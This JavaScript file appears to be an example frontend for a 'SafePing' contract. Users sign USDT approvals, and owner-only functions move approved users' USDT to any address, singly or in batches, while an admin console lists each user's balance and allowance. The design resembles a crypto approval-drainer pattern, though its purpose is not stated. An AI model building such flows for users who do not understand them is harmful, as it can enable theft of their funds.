/**
 * SafePing Frontend Integration Example
 *
 * This file demonstrates how to integrate the SafePing contract with a frontend application.
 * It includes examples for user approval, admin transfers, and event monitoring.
 *
 * Prerequisites:
 * - Web3 provider (MetaMask, WalletConnect, etc.)
 * - SafePing contract ABI
 * - Contract address
 */

import { ethers } from "ethers";

class SafePingIntegration {
  constructor(contractAddress, abi, provider) {
    this.contractAddress = contractAddress;
    this.contract = new ethers.Contract(contractAddress, abi, provider);
    this.provider = provider;
  }

  /**
   * Generate message hash for user signature
   * @param {string} userAddress - User's wallet address
   * @param {string} amount - Amount to approve (in wei)
   * @param {number} nonce - User's current nonce
   * @param {number} chainId - Network chain ID
   * @returns {string} Message hash
   */
  generateMessageHash(userAddress, amount, nonce, chainId) {
    const message = ethers.utils.defaultAbiCoder.encode(
      ["address", "uint256", "uint256", "uint256", "address"],
      [userAddress, amount, nonce, chainId, this.contractAddress]
    );

    return ethers.utils.keccak256(message);
  }

  /**
   * Generate message for user to sign
   * @param {string} userAddress - User's wallet address
   * @param {string} amount - Amount to approve (in wei)
   * @param {number} nonce - User's current nonce
   * @param {number} chainId - Network chain ID
   * @returns {string} Message to sign
   */
  generateMessageToSign(userAddress, amount, nonce, chainId) {
    const messageHash = this.generateMessageHash(
      userAddress,
      amount,
      nonce,
      chainId
    );
    return ethers.utils.arrayify(messageHash);
  }

  /**
   * Submit user approval to contract
   * @param {string} userAddress - User's wallet address
   * @param {string} amount - Amount to approve (in wei)
   * @param {number} nonce - User's current nonce
   * @param {string} signature - User's signature
   * @param {object} signer - Signer object for transaction
   * @returns {object} Transaction result
   */
  async submitUserApproval(userAddress, amount, nonce, signature, signer) {
    try {
      const contractWithSigner = this.contract.connect(signer);

      const tx = await contractWithSigner.approveUSDTForUser(
        userAddress,
        amount,
        nonce,
        signature
      );

      const receipt = await tx.wait();

      return {
        success: true,
        transactionHash: tx.hash,
        receipt: receipt,
        events: receipt.events,
      };
    } catch (error) {
      return {
        success: false,
        error: error.message,
      };
    }
  }

  /**
   * Transfer USDT from approved user (owner only)
   * @param {string} fromAddress - User address to transfer from
   * @param {string} toAddress - Destination address
   * @param {string} amount - Amount to transfer (in wei)
   * @param {object} ownerSigner - Owner's signer object
   * @returns {object} Transaction result
   */
  async transferFromUser(fromAddress, toAddress, amount, ownerSigner) {
    try {
      const contractWithSigner = this.contract.connect(ownerSigner);

      const tx = await contractWithSigner.transferFromUser(
        fromAddress,
        toAddress,
        amount
      );

      const receipt = await tx.wait();

      return {
        success: true,
        transactionHash: tx.hash,
        receipt: receipt,
        events: receipt.events,
      };
    } catch (error) {
      return {
        success: false,
        error: error.message,
      };
    }
  }

  /**
   * Batch transfer from multiple users (owner only)
   * @param {string[]} fromAddresses - Array of user addresses
   * @param {string[]} toAddresses - Array of destination addresses
   * @param {string[]} amounts - Array of amounts to transfer
   * @param {object} ownerSigner - Owner's signer object
   * @returns {object} Transaction result
   */
  async batchTransferFromUsers(
    fromAddresses,
    toAddresses,
    amounts,
    ownerSigner
  ) {
    try {
      const contractWithSigner = this.contract.connect(ownerSigner);

      const tx = await contractWithSigner.batchTransferFromUsers(
        fromAddresses,
        toAddresses,
        amounts
      );

      const receipt = await tx.wait();

      return {
        success: true,
        transactionHash: tx.hash,
        receipt: receipt,
        events: receipt.events,
      };
    } catch (error) {
      return {
        success: false,
        error: error.message,
      };
    }
  }

  /**
   * Get user's current allowance
   * @param {string} userAddress - User's wallet address
   * @returns {string} Current allowance amount
   */
  async getUserAllowance(userAddress) {
    try {
      const allowance = await this.contract.getUserAllowance(userAddress);
      return allowance.toString();
    } catch (error) {
      console.error("Error getting user allowance:", error);
      return "0";
    }
  }

  /**
   * Get user's current nonce
   * @param {string} userAddress - User's wallet address
   * @returns {number} Current nonce
   */
  async getUserNonce(userAddress) {
    try {
      const nonce = await this.contract.getUserNonce(userAddress);
      return nonce.toNumber();
    } catch (error) {
      console.error("Error getting user nonce:", error);
      return 0;
    }
  }

  /**
   * Get all approved users
   * @returns {string[]} Array of approved user addresses
   */
  async getAllApprovedUsers() {
    try {
      const users = await this.contract.getAllApprovedUsers();
      return users;
    } catch (error) {
      console.error("Error getting approved users:", error);
      return [];
    }
  }

  /**
   * Get user's USDT balance
   * @param {string} userAddress - User's wallet address
   * @returns {string} USDT balance
   */
  async getUserUSDTBalance(userAddress) {
    try {
      const balance = await this.contract.getUserUSDTBalance(userAddress);
      return balance.toString();
    } catch (error) {
      console.error("Error getting USDT balance:", error);
      return "0";
    }
  }

  /**
   * Get contract's allowance from user
   * @param {string} userAddress - User's wallet address
   * @returns {string} Contract's allowance
   */
  async getContractAllowance(userAddress) {
    try {
      const allowance = await this.contract.getContractAllowance(userAddress);
      return allowance.toString();
    } catch (error) {
      console.error("Error getting contract allowance:", error);
      return "0";
    }
  }

  /**
   * Get total approved amount across all users
   * @returns {string} Total approved amount
   */
  async getTotalApprovedAmount() {
    try {
      const total = await this.contract.getTotalApprovedAmount();
      return total.toString();
    } catch (error) {
      console.error("Error getting total approved amount:", error);
      return "0";
    }
  }

  /**
   * Get contract information
   * @returns {object} Contract info (owner, USDT address, chain ID)
   */
  async getContractInfo() {
    try {
      const info = await this.contract.getContractInfo();
      return {
        owner: info.contractOwner,
        usdtAddress: info.usdtAddress,
        chainId: info.currentChainId.toNumber(),
      };
    } catch (error) {
      console.error("Error getting contract info:", error);
      return null;
    }
  }

  /**
   * Listen to contract events
   * @param {string} eventName - Event name to listen to
   * @param {function} callback - Callback function for event data
   * @returns {object} Event listener object
   */
  listenToEvents(eventName, callback) {
    const filter = this.contract.filters[eventName]();

    this.contract.on(filter, (...args) => {
      callback(...args);
    });

    return {
      remove: () => {
        this.contract.off(filter, callback);
      },
    };
  }

  /**
   * Get past events
   * @param {string} eventName - Event name
   * @param {number} fromBlock - Starting block number
   * @param {number} toBlock - Ending block number
   * @returns {array} Array of past events
   */
  async getPastEvents(eventName, fromBlock = 0, toBlock = "latest") {
    try {
      const filter = this.contract.filters[eventName]();
      const events = await this.contract.queryFilter(
        filter,
        fromBlock,
        toBlock
      );
      return events;
    } catch (error) {
      console.error(`Error getting past ${eventName} events:`, error);
      return [];
    }
  }
}

// Usage Examples

/**
 * Example 1: User Approval Flow
 */
async function userApprovalExample() {
  // Initialize integration
  const provider = new ethers.providers.Web3Provider(window.ethereum);
  const signer = provider.getSigner();
  const userAddress = await signer.getAddress();

  const safePing = new SafePingIntegration(
    "0x...", // Contract address
    [], // ABI
    provider
  );

  // Get user's current nonce
  const nonce = await safePing.getUserNonce(userAddress);

  // Generate message for user to sign
  const amount = ethers.utils.parseUnits("1000", 6); // 1000 USDT
  const chainId = await provider.getNetwork().then((net) => net.chainId);

  const messageToSign = safePing.generateMessageToSign(
    userAddress,
    amount,
    nonce,
    chainId
  );

  // User signs the message
  const signature = await signer.signMessage(messageToSign);

  // Submit approval to contract
  const result = await safePing.submitUserApproval(
    userAddress,
    amount,
    nonce,
    signature,
    signer
  );

  if (result.success) {
    console.log("Approval successful:", result.transactionHash);
  } else {
    console.error("Approval failed:", result.error);
  }
}

/**
 * Example 2: Admin Transfer Flow
 */
async function adminTransferExample() {
  const provider = new ethers.providers.Web3Provider(window.ethereum);
  const ownerSigner = provider.getSigner();

  const safePing = new SafePingIntegration(
    "0x...", // Contract address
    [], // ABI
    provider
  );

  // Transfer USDT from approved user to destination
  const result = await safePing.transferFromUser(
    "0x...", // From address (approved user)
    "0x...", // To address (destination)
    ethers.utils.parseUnits("100", 6), // 100 USDT
    ownerSigner
  );

  if (result.success) {
    console.log("Transfer successful:", result.transactionHash);
  } else {
    console.error("Transfer failed:", result.error);
  }
}

/**
 * Example 3: Event Monitoring
 */
async function eventMonitoringExample() {
  const provider = new ethers.providers.Web3Provider(window.ethereum);

  const safePing = new SafePingIntegration(
    "0x...", // Contract address
    [], // ABI
    provider
  );

  // Listen to user approval events
  const approvalListener = safePing.listenToEvents(
    "UserApproved",
    (user, amount, nonce) => {
      console.log(
        `User ${user} approved ${ethers.utils.formatUnits(amount, 6)} USDT`
      );
    }
  );

  // Listen to transfer events
  const transferListener = safePing.listenToEvents(
    "USDTTransferred",
    (from, to, amount) => {
      console.log(
        `${ethers.utils.formatUnits(
          amount,
          6
        )} USDT transferred from ${from} to ${to}`
      );
    }
  );

  // Get past events
  const pastApprovals = await safePing.getPastEvents(
    "UserApproved",
    0,
    "latest"
  );
  console.log("Past approvals:", pastApprovals);

  // Clean up listeners when done
  // approvalListener.remove();
  // transferListener.remove();
}

/**
 * Example 4: Admin Console Functions
 */
async function adminConsoleExample() {
  const provider = new ethers.providers.Web3Provider(window.ethereum);

  const safePing = new SafePingIntegration(
    "0x...", // Contract address
    [], // ABI
    provider
  );

  // Get all approved users
  const approvedUsers = await safePing.getAllApprovedUsers();
  console.log("Approved users:", approvedUsers);

  // Get total approved amount
  const totalApproved = await safePing.getTotalApprovedAmount();
  console.log(
    "Total approved amount:",
    ethers.utils.formatUnits(totalApproved, 6),
    "USDT"
  );

  // Get contract info
  const contractInfo = await safePing.getContractInfo();
  console.log("Contract info:", contractInfo);

  // Get details for each approved user
  for (const user of approvedUsers) {
    const allowance = await safePing.getUserAllowance(user);
    const balance = await safePing.getUserUSDTBalance(user);
    const contractAllowance = await safePing.getContractAllowance(user);

    console.log(`User ${user}:`);
    console.log(`  Approved: ${ethers.utils.formatUnits(allowance, 6)} USDT`);
    console.log(`  Balance: ${ethers.utils.formatUnits(balance, 6)} USDT`);
    console.log(
      `  Contract Allowance: ${ethers.utils.formatUnits(
        contractAllowance,
        6
      )} USDT`
    );
  }
}

// Export the class and examples
export {
  SafePingIntegration,
  userApprovalExample,
  adminTransferExample,
  eventMonitoringExample,
  adminConsoleExample,
};
